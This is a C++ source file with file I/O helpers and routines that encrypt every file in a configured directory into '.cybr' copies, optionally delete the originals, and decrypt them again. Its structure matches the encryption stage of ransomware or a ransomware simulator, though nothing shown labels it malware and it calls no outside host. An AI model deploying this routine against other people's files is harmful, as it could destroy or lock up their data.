/**
 * @file file_ops.cpp
 * @brief File system operations and directory processing logic.
 */

#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include "config.hpp"

/**
 * @namespace fs
 * @brief Alias for the standard filesystem library used for path and directory operations.
 */
namespace fs = std::filesystem;

/**
 * @namespace CryptoCore
 * @brief Internal cryptographic operations for key generation and wrapping.
 */
namespace CryptoCore
{
    std::vector<unsigned char> encrypt_file_data(const std::vector<unsigned char> &symkey, const std::vector<unsigned char> &plain);
    std::vector<unsigned char> decrypt_file_data(const std::vector<unsigned char> &symkey, const std::vector<unsigned char> &pkg);
}

/**
 * @namespace FileOps
 * @brief File system interactions for reading, writing, and directory traversal.
 */
namespace FileOps
{
    /**
     * Reads a binary file into a byte vector.
     */
    std::vector<unsigned char> read_file(const fs::path &path)
    {
        std::ifstream file(path, std::ios::binary | std::ios::ate);
        if (!file.is_open())
            throw std::runtime_error("Cannot open file: " + path.string());

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<unsigned char> buffer(size);
        file.read((char *)buffer.data(), size);
        return buffer;
    }

    /**
     * Writes binary data to a file.
     */
    void write_file(const fs::path &path, const std::vector<unsigned char> &data)
    {
        std::ofstream file(path, std::ios::binary);
        if (!file.is_open())
            throw std::runtime_error("Cannot write to: " + path.string());
        file.write((const char *)data.data(), data.size());
    }

    /**
     * Overloaded: Writes a string to a file (used for Base64 capsules).
     */
    void write_file(const fs::path &path, const std::string &data)
    {
        std::ofstream file(path);
        file << data;
    }

    /**
     * Reads file content as a string.
     */
    std::string read_file_as_string(const fs::path &path)
    {
        std::ifstream file(path);
        return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    }

    /**
     * Processes all eligible files for encryption.
     */
    void process_encryption(const std::vector<unsigned char> &symkey)
    {
        fs::path target(Config::TARGET_DIR);
        if (!fs::exists(target))
            return;

        for (const auto &entry : fs::directory_iterator(target))
        {
            if (!entry.is_regular_file() || entry.path().extension() == Config::FILE_EXTENSION ||
                entry.path().filename() == Config::EWK_FILENAME)
                continue;

            try
            {
                auto plain = read_file(entry.path());
                auto encrypted = CryptoCore::encrypt_file_data(symkey, plain);

                fs::path outPath = entry.path();
                outPath += Config::FILE_EXTENSION;
                write_file(outPath, encrypted);

                if (Config::REMOVE_ORIGINAL_FILES)
                    fs::remove(entry.path());
                std::cout << "[+] Protected: " << entry.path().filename() << "\n";
            }
            catch (const std::exception &e)
            {
                std::cerr << "[-] Failed: " << entry.path().filename() << " (" << e.what() << ")\n";
            }
        }
    }

    /**
     * Processes all .cybr files for decryption.
     */
    void process_decryption(const std::vector<unsigned char> &symkey)
    {
        fs::path target(Config::TARGET_DIR);
        if (!fs::exists(target))
            return;

        for (const auto &entry : fs::directory_iterator(target))
        {
            if (!entry.is_regular_file() || entry.path().extension() != Config::FILE_EXTENSION)
                continue;

            try
            {
                auto encrypted = read_file(entry.path());
                auto plain = CryptoCore::decrypt_file_data(symkey, encrypted);

                fs::path outPath = entry.path();
                outPath.replace_extension(""); // Remove .cybr
                write_file(outPath, plain);

                fs::remove(entry.path());
                std::cout << "[+] Restored: " << outPath.filename() << "\n";
            }
            catch (const std::exception &e)
            {
                std::cerr << "[-] Integrity error: " << entry.path().filename() << "\n";
            }
        }
    }
}